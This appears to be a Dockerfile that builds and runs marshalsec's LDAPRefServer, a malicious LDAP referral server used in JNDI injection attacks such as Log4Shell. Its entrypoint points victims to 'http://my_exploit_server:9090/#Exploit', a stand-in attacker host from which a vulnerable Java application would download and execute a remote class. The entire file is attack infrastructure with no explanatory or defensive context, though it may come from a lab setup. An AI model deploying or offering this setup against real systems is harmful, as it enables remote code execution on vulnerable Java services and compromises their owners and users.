# Build stage
FROM maven AS build
    WORKDIR /app
    # Copy source code and build artifact 'ldap_server-1.0-all.jar'
    COPY . . 
    RUN mvn clean package -DskipTests

# Run stage
FROM openjdk:19-buster
    WORKDIR /app
    COPY --from=build /app/target/ldap_server-1.0-all.jar .
    ENTRYPOINT ["java", "-cp", "ldap_server-1.0-all.jar", "marshalsec.jndi.LDAPRefServer", "http://my_exploit_server:9090/#Exploit"]